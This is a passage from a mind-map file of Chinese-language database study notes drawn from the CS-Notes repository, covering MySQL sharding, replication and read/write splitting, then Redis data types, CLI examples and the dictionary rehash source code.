      应该尽量使用 TIMESTAMP，因为它比 DATETIME 空间效率更高。
    </p>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node FOLDED="true" ID="ID_1691423334" CREATED="1754750563834" MODIFIED="1754750563834"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      五、切分
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_370491925" CREATED="1754750563836" MODIFIED="1754750563837"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      水平切分
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 水平切分" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#水平切分">
</a>
    <p dir="auto">
      水平切分又称为 Sharding，它是将同一个表中的记录拆分到多个结构相同的表中。
    </p>
    <p dir="auto">
      当一个表的数据不断增多时，Sharding 是必然的选择，它可以将数据分布到集群的不同节点上，从而缓存单个数据库的压力。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/b7c18926888b1076e2f0cf372c83bb44a2837309f97bd7f8699d6f052840108d/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f36336332393039662d306335662d343936662d396665352d6565393137366233316162612e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/b7c18926888b1076e2f0cf372c83bb44a2837309f97bd7f8699d6f052840108d/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f36336332393039662d306335662d343936662d396665352d6565393137366233316162612e6a7067" width="" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/63c2909f-0c5f-496f-9fe5-ee9176b31aba.jpg"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1354336567" CREATED="1754750563838" MODIFIED="1754750563839"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      垂直切分
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 垂直切分" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#垂直切分">
</a>
    <p dir="auto">
      垂直切分是将一张表按列切分成多个表，通常是按照列的关系密集程度进行切分，也可以利用垂直切分将经常被使用的列和不经常被使用的列切分到不同的表中。
    </p>
    <p dir="auto">
      在数据库的层面使用垂直切分将按数据库中表的密集程度部署到不同的库中，例如将原来的电商数据库垂直切分成商品数据库、用户数据库等。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/9fec59cd7513e5995a3a6c099457e72af9719614d37c88e4c048d2da1199eb2e/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f65313330653562382d623139612d346631652d623836302d3232333034303532356366362e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/9fec59cd7513e5995a3a6c099457e72af9719614d37c88e4c048d2da1199eb2e/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f65313330653562382d623139612d346631652d623836302d3232333034303532356366362e6a7067" width="" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/e130e5b8-b19a-4f1e-b860-223040525cf6.jpg"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_969900711" CREATED="1754750563839" MODIFIED="1754750563841"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Sharding 策略
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Sharding 策略" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#sharding-策略">
</a>
    <ul dir="auto">
      <li>
        哈希取模：hash(key) % N；
      </li>
      <li>
        范围：可以是 ID 范围也可以是时间范围；
      </li>
      <li>
        映射表：使用单独的一个数据库来存储映射关系。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_1880461339" CREATED="1754750563841" MODIFIED="1754750563841"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Sharding 存在的问题
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_955601939" CREATED="1754750563842" MODIFIED="1754750563844"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 事务问题
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 事务问题" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#1-事务问题">
</a>
    <p dir="auto">
      使用分布式事务来解决，比如 XA 接口。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1872730463" CREATED="1754750563844" MODIFIED="1754750563846"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 连接
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 连接" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#2-连接">
</a>
    <p dir="auto">
      可以将原来的连接分解成多个单表查询，然后在用户程序中进行连接。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_861521943" CREATED="1754750563846" MODIFIED="1754750563848"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. ID 唯一性
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. ID 唯一性" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#3-id-唯一性">
</a>
    <ul dir="auto">
      <li>
        使用全局唯一 ID（GUID）
      </li>
      <li>
        为每个分片指定一个 ID 范围
      </li>
      <li>
        分布式 ID 生成器 (如 Twitter 的 Snowflake 算法)
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node FOLDED="true" ID="ID_401186104" CREATED="1754750563848" MODIFIED="1754750563848"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      六、复制
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_853491669" CREATED="1754750563849" MODIFIED="1754750563851"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      主从复制
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 主从复制" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#主从复制">
</a>
    <p dir="auto">
      主要涉及三个线程：binlog 线程、I/O 线程和 SQL 线程。
    </p>
    <ul dir="auto">
      <li>
        <strong>binlog 线程</strong>&#xa0;：负责将主服务器上的数据更改写入二进制日志（Binary log）中。
      </li>
      <li>
        <strong>I/O 线程</strong>&#xa0;：负责从主服务器上读取二进制日志，并写入从服务器的中继日志（Relay log）。
      </li>
      <li>
        <strong>SQL 线程</strong>&#xa0;：负责读取中继日志，解析出主服务器已经执行的数据更改并在从服务器中重放（Replay）。
      </li>
    </ul>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/b8890cb31ac78db8de8514d074007f8b46c9f2a7e3940f368cdc848b678391a9/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f6d61737465722d736c6176652e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/b8890cb31ac78db8de8514d074007f8b46c9f2a7e3940f368cdc848b678391a9/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f6d61737465722d736c6176652e706e67" width="" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/master-slave.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1449705085" CREATED="1754750563851" MODIFIED="1754750563853"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      读写分离
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 读写分离" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#读写分离">
</a>
    <p dir="auto">
      主服务器处理写操作以及实时性要求比较高的读操作，而从服务器处理读操作。
    </p>
    <p dir="auto">
      读写分离能提高性能的原因在于：
    </p>
    <ul dir="auto">
      <li>
        主从服务器负责各自的读和写，极大程度缓解了锁的争用；
      </li>
      <li>
        从服务器可以使用 MyISAM，提升查询性能以及节约系统开销；
      </li>
      <li>
        增加冗余，提高可用性。
      </li>
    </ul>
    <p dir="auto">
      读写分离常用代理方式来实现，代理服务器接收应用层传来的读写请求，然后决定转发到哪个服务器。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/1a41ed33aa2558187c8c0a29763cb3493576337f10d57438d8da752fc39d21bb/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f6d61737465722d736c6176652d70726f78792e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/1a41ed33aa2558187c8c0a29763cb3493576337f10d57438d8da752fc39d21bb/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f6d61737465722d736c6176652d70726f78792e706e67" width="" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/master-slave-proxy.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_376729734" CREATED="1754750563853" MODIFIED="1754750563855"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      参考资料
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 参考资料" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#参考资料">
</a>
    <ul dir="auto">
      <li>
        BaronScbwartz, PeterZaitsev, VadimTkacbenko, 等. 高性能 MySQL[M]. 电子工业出版社, 2013.
      </li>
      <li>
        姜承尧. MySQL 技术内幕: InnoDB 存储引擎 [M]. 机械工业出版社, 2011.
      </li>
      <li>
        <a href="https://www.jfox.info/20-tiao-mysql-xing-nen-you-hua-de-zui-jia-jing-yan.html" rel="nofollow">20+ 条 MySQL 性能优化的最佳经验</a>
      </li>
      <li>
        <a href="http://blog.720ui.com/2017/mysql_core_09_multi_db_table2/" title="服务端指南 数据存储篇 | MySQL（09） 分库与分表带来的分布式困境与应对之策" rel="nofollow">服务端指南 数据存储篇 | MySQL（09） 分库与分表带来的分布式困境与应对之策</a>
      </li>
      <li>
        <a href="https://stackoverflow.com/questions/788829/how-to-create-unique-row-id-in-sharded-databases" rel="nofollow">How to create unique row ID in sharded databases?</a>
      </li>
      <li>
        <a href="http://geekswithblogs.net/shaunxu/archive/2012/01/07/sql-azure-federation-ndash-introduction.aspx" title="Title of this entry." rel="nofollow">SQL Azure Federation – Introduction</a>
      </li>
      <li>
        <a href="http://blog.codinglabs.org/articles/theory-of-mysql-index.html" rel="nofollow">MySQL 索引背后的数据结构及算法原理</a>
      </li>
      <li>
        <a href="https://segmentfault.com/a/1190000008131735" rel="nofollow">MySQL 性能优化神器 Explain 使用分析</a>
      </li>
      <li>
        <a href="https://medium.com/@jeeyoungk/how-sharding-works-b4dec46b3f6" rel="nofollow">How Sharding Works</a>
      </li>
      <li>
        <a href="https://tech.meituan.com/dianping_order_db_sharding.html" rel="nofollow">大众点评订单系统分库分表实践</a>
      </li>
      <li>
        <a href="https://zh.wikipedia.org/wiki/B%2B%E6%A0%91" rel="nofollow">B + 树</a>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_250585500" CREATED="1754749805683" MODIFIED="1754750573200" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Redis
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1771886572" CREATED="1754750570074" MODIFIED="1754750570077"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      一、概述
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 一、概述" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#一概述">
</a>
    <p dir="auto">
      Redis 是速度非常快的非关系型（NoSQL）内存键值数据库，可以存储键和五种不同类型的值之间的映射。
    </p>
    <p dir="auto">
      键的类型只能为字符串，值支持五种数据类型：字符串、列表、集合、散列表、有序集合。
    </p>
    <p dir="auto">
      Redis 支持很多特性，例如将内存中的数据持久化到硬盘中，使用复制来扩展读性能，使用分片来扩展写性能。
    </p>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_1055394111" CREATED="1754750570077" MODIFIED="1754752162911"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      二、数据类型
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="tableWrapper">
      <table>
        <colgroup>
        <col/>
        <col/>
        <col/>
        </colgroup>
        

        <tr>
          <th colspan="1" rowspan="1">
            <p>
              数据类型
            </p>
          </th>
          <th colspan="1" rowspan="1">
            <p>
              可以存储的值
            </p>
          </th>
          <th colspan="1" rowspan="1">
            <p>
              操作
            </p>
          </th>
        </tr>
        <tr>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              STRING
            </p>
          </td>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              字符串、整数或者浮点数
            </p>
          </td>
          <td colspan="1" rowspan="1" draggable="true">
            <ul>
              <li>
                <p>
                  对整个字符串或者字符串的其中一部分执行操作
                </p>
              </li>
              <li>
                <p>
                  对整数和浮点数执行自增或者自减操作
                </p>
              </li>
            </ul>
          </td>
        </tr>
        <tr>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              LIST
            </p>
          </td>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              列表
            </p>
          </td>
          <td colspan="1" rowspan="1" draggable="true">
            <ul>
              <li>
                <p>
                  从两端压入或者弹出元素
                </p>
              </li>
              <li>
                <p>
                  对单个或者多个元素进行修剪，只保留一个范围内的元素
                </p>
              </li>
            </ul>
          </td>
        </tr>
        <tr>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              SET
            </p>
          </td>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              无序集合
            </p>
          </td>
          <td colspan="1" rowspan="1" draggable="true">
            <ul>
              <li>
                <p>
                  添加、获取、移除单个元素
                </p>
              </li>
              <li>
                <p>
                  检查一个元素是否存在于集合中
                </p>
              </li>
              <li>
                <p>
                  计算交集、并集、差集
                </p>
              </li>
              <li>
                <p>
                  从集合里面随机获取元素
                </p>
              </li>
            </ul>
          </td>
        </tr>
        <tr>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              HASH
            </p>
          </td>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              包含键值对的无序散列表
            </p>
          </td>
          <td colspan="1" rowspan="1" draggable="true">
            <ul>
              <li>
                <p>
                  添加、获取、移除单个键值对
                </p>
              </li>
              <li>
                <p>
                  获取所有键值对
                </p>
              </li>
              <li>
                <p>
                  检查某个键是否存在
                </p>
              </li>
            </ul>
          </td>
        </tr>
        <tr>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              ZSET
            </p>
          </td>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              有序集合
            </p>
          </td>
          <td colspan="1" rowspan="1" draggable="true">
            <ul>
              <li>
                <p>
                  添加、获取、删除元素
                </p>
              </li>
              <li>
                <p>
                  根据分值范围或者成员来获取元素
                </p>
              </li>
              <li>
                <p>
                  计算一个键的排名
                </p>
              </li>
            </ul>
          </td>
        </tr>
      </table>
    </div>
    <blockquote>
      <p>
        <a href="https://redislabs.com/ebook/part-1-getting-started/chapter-1-getting-to-know-redis/1-2-what-redis-data-structures-look-like/">What Redis data structures look like</a>
      </p>
    </blockquote>
  </body>
</html></richcontent>
<node ID="ID_592697145" CREATED="1754750570080" MODIFIED="1754750570082"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      STRING
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: STRING" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#string">
</a><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/b05e261cbacd8b2b11c56b06efac1338dac812fae2bf3c71e84d3065497ab1a7/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f36303139623264622d626333652d343430382d623664382d3936303235663434383164362e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/b05e261cbacd8b2b11c56b06efac1338dac812fae2bf3c71e84d3065497ab1a7/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f36303139623264622d626333652d343430382d623664382d3936303235663434383164362e706e67" width="400" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/6019b2db-bc3e-4408-b6d8-96025f4481d6.png"/></a><br/>
    <pre>&gt; set hello world
OK
&gt; get hello
&quot;world&quot;
&gt; del hello
(integer) 1
&gt; get hello
(nil)</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1698673688" CREATED="1754750570083" MODIFIED="1754752013913"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      LIST
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      <img src="https://camo.githubusercontent.com/5971198d2930e6a1d2af3f3ed2a1926fb888dfcdc14d46d8a09800daf18c78f1/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f66623332373631312d376532622d346632662d396635622d3338353932643430386630372e706e67" width="312" height="230" style="width: 312px; height: 230px;"/>
      <br/>
      
    </p>
    <pre><code class="language-plaintext">&gt; rpush list-key item
(integer) 1
&gt; rpush list-key item2
(integer) 2
&gt; rpush list-key item
(integer) 3
&gt; lrange list-key 0 -1
1) &quot;item&quot;
2) &quot;item2&quot;
3) &quot;item&quot;
&gt; lindex list-key 1
&quot;item2&quot;
&gt; lpop list-key
&quot;item&quot;
&gt; lrange list-key 0 -1
1) &quot;item2&quot;
2) &quot;item&quot;</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1422845473" CREATED="1754750570087" MODIFIED="1754750570089"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      SET
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: SET" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#set">
</a><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/1d649fa845e2dd221bba017f48ed7f4c8f1b9dfcdbf6635c8c49ddebc7f98936/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f63643566626366662d336633352d343361362d386666612d3038326139336365306630652e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/1d649fa845e2dd221bba017f48ed7f4c8f1b9dfcdbf6635c8c49ddebc7f98936/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f63643566626366662d336633352d343361362d386666612d3038326139336365306630652e706e67" width="400" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/cd5fbcff-3f35-43a6-8ffa-082a93ce0f0e.png"/></a><br/>
    <pre>&gt; sadd set-key item
(integer) 1
&gt; sadd set-key item2
(integer) 1
&gt; sadd set-key item3
(integer) 1
&gt; sadd set-key item
(integer) 0
&gt; smembers set-key
1) &quot;item&quot;
2) &quot;item2&quot;
3) &quot;item3&quot;
&gt; sismember set-key item4
(integer) 0
&gt; sismember set-key item
(integer) 1
&gt; srem set-key item2
(integer) 1
&gt; srem set-key item2
(integer) 0
&gt; smembers set-key
1) &quot;item&quot;
2) &quot;item3&quot;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1127274995" CREATED="1754750570089" MODIFIED="1754750570092"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      HASH
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: HASH" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#hash">
</a><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/3f054b4f68cbd5f3137690db470d359e08c0af7e49c6b5dcd4a23bf0b345c8c3/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f37626432303261372d393364342d346633612d613837382d6166363861653235353339612e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/3f054b4f68cbd5f3137690db470d359e08c0af7e49c6b5dcd4a23bf0b345c8c3/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f37626432303261372d393364342d346633612d613837382d6166363861653235353339612e706e67" width="400" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7bd202a7-93d4-4f3a-a878-af68ae25539a.png"/></a><br/>
    <pre>&gt; hset hash-key sub-key1 value1
(integer) 1
&gt; hset hash-key sub-key2 value2
(integer) 1
&gt; hset hash-key sub-key1 value1
(integer) 0
&gt; hgetall hash-key
1) &quot;sub-key1&quot;
2) &quot;value1&quot;
3) &quot;sub-key2&quot;
4) &quot;value2&quot;
&gt; hdel hash-key sub-key2
(integer) 1
&gt; hdel hash-key sub-key2
(integer) 0
&gt; hget hash-key sub-key1
&quot;value1&quot;
&gt; hgetall hash-key
1) &quot;sub-key1&quot;
2) &quot;value1&quot;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_444651573" CREATED="1754750570092" MODIFIED="1754750570096"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      ZSET
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: ZSET" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#zset">
</a><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/a26b9ed670310c9f173a03298c4f4692ecb8a66798e9a6dc129bf4a9230561c8/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f31323032623264362d393436392d343235312d626434372d6361363033346662363131362e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/a26b9ed670310c9f173a03298c4f4692ecb8a66798e9a6dc129bf4a9230561c8/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f31323032623264362d393436392d343235312d626434372d6361363033346662363131362e706e67" width="400" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1202b2d6-9469-4251-bd47-ca6034fb6116.png"/></a><br/>
    <pre>&gt; zadd zset-key 728 member1
(integer) 1
&gt; zadd zset-key 982 member0
(integer) 1
&gt; zadd zset-key 982 member0
(integer) 0
&gt; zrange zset-key 0 -1 withscores
1) &quot;member1&quot;
2) &quot;728&quot;
3) &quot;member0&quot;
4) &quot;982&quot;
&gt; zrangebyscore zset-key 0 800 withscores
1) &quot;member1&quot;
2) &quot;728&quot;
&gt; zrem zset-key member1
(integer) 1
&gt; zrem zset-key member1
(integer) 0
&gt; zrange zset-key 0 -1 withscores
1) &quot;member0&quot;
2) &quot;982&quot;</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_909955685" CREATED="1754750570096" MODIFIED="1754750570096"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      三、数据结构
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_331955149" CREATED="1754750570098" MODIFIED="1754750570101"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      字典
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 字典" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#字典">
</a>
    <p dir="auto">
      dictht 是一个散列表结构，使用拉链法解决哈希冲突。
    </p>
    <pre>/* This is our hash table structure. Every dictionary has two of this as we
 * implement incremental rehashing, for the old to the new table. */
typedef struct dictht {
    dictEntry **table;
    unsigned long size;
    unsigned long sizemask;
    unsigned long used;
} dictht;</pre>
    <pre>typedef struct dictEntry {
    void *key;
    union {
        void *val;
        uint64_t u64;
        int64_t s64;
        double d;
    } v;
    struct dictEntry *next;
} dictEntry;</pre>
    <p dir="auto">
      Redis 的字典 dict 中包含两个哈希表 dictht，这是为了方便进行 rehash 操作。在扩容时，将其中一个 dictht 上的键值对 rehash 到另一个 dictht 上面，完成之后释放空间并交换两个 dictht 的角色。
    </p>
    <pre>typedef struct dict {
    dictType *type;
    void *privdata;
    dictht ht[2];
    long rehashidx; /* rehashing not in progress if rehashidx == -1 */
    unsigned long iterators; /* number of iterators currently running */
} dict;</pre>
    <p dir="auto">
      rehash 操作不是一次性完成，而是采用渐进方式，这是为了避免一次性执行过多的 rehash 操作给服务器带来过大的负担。
    </p>
    <p dir="auto">
      渐进式 rehash 通过记录 dict 的 rehashidx 完成，它从 0 开始，然后每执行一次 rehash 都会递增。例如在一次 rehash 中，要把 dict[0] rehash 到 dict[1]，这一次会把 dict[0] 上 table[rehashidx] 的键值对 rehash 到 dict[1] 上，dict[0] 的 table[rehashidx] 指向 null，并令 rehashidx++。
    </p>
    <p dir="auto">
      在 rehash 期间，每次对字典执行添加、删除、查找或者更新操作时，都会执行一次渐进式 rehash。
    </p>
    <p dir="auto">
      采用渐进式 rehash 会导致字典中的数据分散在两个 dictht 上，因此对字典的查找操作也需要到对应的 dictht 去执行。
    </p>
    <pre>/* Performs N steps of incremental rehashing. Returns 1 if there are still
 * keys to move from the old to the new hash table, otherwise 0 is returned.
 *
 * Note that a rehashing step consists in moving a bucket (that may have more
 * than one key as we use chaining) from the old to the new hash table, however
 * since part of the hash table may be composed of empty spaces, it is not
 * guaranteed that this function will rehash even a single bucket, since it
 * will visit at max N*10 empty buckets in total, otherwise the amount of
 * work it does would be unbound and the function may block for a long time. */
int dictRehash(dict *d, int n) {
    int empty_visits = n * 10; /* Max number of empty buckets to visit. */
    if (!dictIsRehashing(d)) return 0;
    while (n-- &amp;&amp; d-&gt;ht[0].used != 0) {
        dictEntry *de, *nextde;
        /* Note that rehashidx can't overflow as we are sure there are more
         * elements because ht[0].used != 0 */
        assert(d-&gt;ht[0].size &gt; (unsigned long) d-&gt;rehashidx);
        while (d-&gt;ht[0].table[d-&gt;rehashidx] == NULL) {
            d-&gt;rehashidx++;
            if (--empty_visits == 0) return 1;
        }
        de = d-&gt;ht[0].table[d-&gt;rehashidx];
        /* Move all the keys in this bucket from the old to the new hash HT */
        while (de) {
            uint64_t h;
            nextde = de-&gt;next;
            /* Get the index in the new hash table */
            h = dictHashKey(d, de-&gt;key) &amp; d-&gt;ht[1].sizemask;
            de-&gt;next = d-&gt;ht[1].table[h];
            d-&gt;ht[1].table[h] = de;
            d-&gt;ht[0].used--;
            d-&gt;ht[1].used++;
            de = nextde;
        }
        d-&gt;ht[0].table[d-&gt;rehashidx] = NULL;
        d-&gt;rehashidx++;
    }
    /* Check if we already rehashed the whole table... */
    if (d-&gt;ht[0].used == 0) {
        zfree(d-&gt;ht[0].table);
        d-&gt;ht[0] = d-&gt;ht[1];
        _dictReset(&amp;d-&gt;ht[1]);
        d-&gt;rehashidx = -1;
        return 0;
    }
    /* More to rehash... */
    return 1;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_649955402" CREATED="1754750570101" MODIFIED="1754750570104"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      跳跃表
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 跳跃表" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#跳跃表">
</a>
    <p dir="auto">
      是有序集合的底层实现之一。
    </p>
    <p dir="auto">
      跳跃表是基于多指针有序链表实现的，可以看成多个有序链表。
    </p>
